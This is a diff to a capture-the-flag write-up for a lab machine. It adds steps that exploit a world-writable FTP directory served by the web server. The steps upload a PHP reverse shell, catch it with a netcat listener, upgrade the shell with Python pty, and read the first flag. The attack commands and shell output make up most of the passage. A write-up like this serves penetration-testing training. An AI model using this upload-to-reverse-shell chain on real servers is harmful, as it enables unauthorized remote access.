@@ -215,10 +215,98 @@ As well as the empty directory named ```ftp``` which we had write access to.
 
 This vulnerability gives us the ability to upload a reverse shell on the FTP server into this directory and come back to this site to access it.
 
-Let's try it out.
+Let's try it out. We'll start by connecting to FTP again, changing into the ```/ftp``` directory and trying to upload a random text file to see if it shows up on the website.
 
+```
+ftp> cd ftp
+250 Directory successfully changed.
 
+ftp> put test.txt
+local: test.txt remote: test.txt
+229 Entering Extended Passive Mode (|||18849|)
+150 Ok to send data.
+100% |***********************************|    12        0.17 KiB/s    00:00 ETA
+226 Transfer complete.
+12 bytes sent in 00:00 (0.02 KiB/s)
+```
 
+After we've uploaded the random text file using the ```put``` command we can check the ```/files/ftp``` directory on the website where we can verify the file was uploaded.
+
+![Test Upload](./Assets/test-upload.png "Unprotected directory with text file")
+
+Now that we know it works we can upload a reverse shell and start a NetCat listener.
+
+The one I used was created by PentestMonkey and can be found on his GitHub [here](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php "Pentest Monkey PHP Reverse Shell on GitHub").
+
+```
+ftp> put reverse-shell.php
+local: reverse-shell.php remote: reverse-shell.php
+229 Entering Extended Passive Mode (|||27200|)
+150 Ok to send data.
+100% |***********************************|  3455       29.15 MiB/s    00:00 ETA
+226 Transfer complete.
+3455 bytes sent in 00:00 (9.87 KiB/s)
+ftp>
+```
+
+```
+$ nc -lnvp 1234
+Listening on 0.0.0.0 1234
+
+```
+
+Once the reverse shell has been uploaded and NetCat has started, navigate to ```http://<IP_Address>/files/ftp/``` and click the file, the request will hang. Now check your NetCat listener, if successful, it should look something like this.
+
+```
+$ nc -lnvp 1234
+Listening on 0.0.0.0 1234
+
+Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 19:57:11 up  1:06,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$
+```
+
+Now that we're in, we can check who we are with ```whoami``` and where we are with ```pwd```.
+
+```bash
+$ whoami
+www-data
+$ pwd
+/
+```
+
+So we're ```www-data``` and we're in the root directory.
+
+Seeing as how we'll be in this system for awhile we might as well check if Python is installed so we can upgrade to a bash shell.
+
+Verify Python is present on the target system with the ```which``` command, if it returns a directory then it's installed.
+
+```bash
+$ which python
+/usr/bin/python
+```
+
+Once we've verified Python is installed we can run the following command to upgrade the shell.
+
+```python -c 'import pty;pty.spawn("/bin/bash")'```
+
+Now we can look for the flags a bit more comfortably.
+
+If we run ```ls -la``` on the current directory we'll see two things that stand out. A file called ```recipe.txt``` and a directory that doesn't belong here named ```incidents```.
+
+More on the ```incidents``` directory later, for now all we need is the ```recipe.txt``` file.
+
+```
+www-data@startup:/$ cat recipe.txt
+cat recipe.txt
+Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.
+```
+
+Reading the ```recipe.txt``` file reveals the first flag to be the word 
+```love```.
 
 ### [Back To Top](#startup "Jump To Top")
 
